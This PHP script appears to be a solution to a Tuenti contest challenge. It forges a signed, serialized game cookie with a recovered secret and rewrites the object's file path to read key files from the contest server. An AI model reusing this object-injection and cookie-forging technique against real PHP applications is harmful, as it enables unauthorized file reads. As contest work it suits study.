<?php
  /*
   * $gamestate = base64_encode(serialize($this->game));
   * $h = md5($gamestate . $this->secret);
   * setcookie('game', $gamestate . "|" . $h, time() + (86400 * 7));
   * */
  $key = file_get_contents("php://stdin");
  $key = str_replace("\n","",$key); //assumes single input
  $dir = "/home/ttt/data/keys/".$key;
  $len = strlen($dir);
  //Any valid game cookie.
  $gamecookie = 'Tzo0OiJnYW1lIjozOntzOjExOiIAZ2FtZQBib2FyZCI7Tzo1OiJib2FyZCI6Mzp7czoxMjoiAGJvYXJkAGJvYXJkIjthOjM6e2k6MDthOjM6e2k6MDtzOjE6Ik8iO2k6MTtzOjE6IlgiO2k6MjtzOjE6Ik8iO31pOjE7YTozOntpOjA7YjowO2k6MTtiOjA7aToyO2I6MDt9aToyO2E6Mzp7aTowO2I6MDtpOjE7YjowO2k6MjtiOjA7fX1zOjEzOiIAYm9hcmQAd2lubmVyIjtiOjA7czoxNDoiAGJvYXJkAHdpbkxpbmUiO3M6MDoiIjt9czoxNToiAGdhbWUAbmV4dFBpZWNlIjtzOjE6IlgiO3M6MTE6InZlcnNpb25GaWxlIjtzOjM1OiIvaG9tZS90dHQvZGF0YS9tZXNzYWdlcy92ZXJzaW9uLnR4dCI7fQ==';
  $game = base64_decode($gamecookie);
  $game = str_replace("35",$len,$game);
  $game = str_replace("/home/ttt/data/messages/version.txt",$dir,$game);

  //Secret found via secret.cpp
  $secret = "IETN";
  $gamestate = base64_encode($game);
  $h = md5($gamestate . $secret);
  $cookie = urlencode($gamestate). "%7C" . $h;
  
  $curl_url = "http://ttt.contest.tuenti.net/";
  $curl_cookie = "game=".$cookie;
  $curl_r = curl_init();
  //Set that headers response is wanted
  curl_setopt($curl_r, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl_r, CURLOPT_HEADER, 1);
  //Set URL and cookie.
  curl_setopt($curl_r,CURLOPT_URL, $curl_url);
  curl_setopt($curl_r,CURLOPT_COOKIE, $curl_cookie);
  $result = curl_exec($curl_r);
  curl_close($curl_r);
  //Get well-formatted output.
  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $m);
  $result = str_replace("X-Tuenti-Powered-By=","",$m[1][1]);
  echo $result.PHP_EOL;
  //Inappropriate easter egg for problem reader:
  //my first youtube upload (problem related) http://youtu.be/7XUKVj328z0
?>
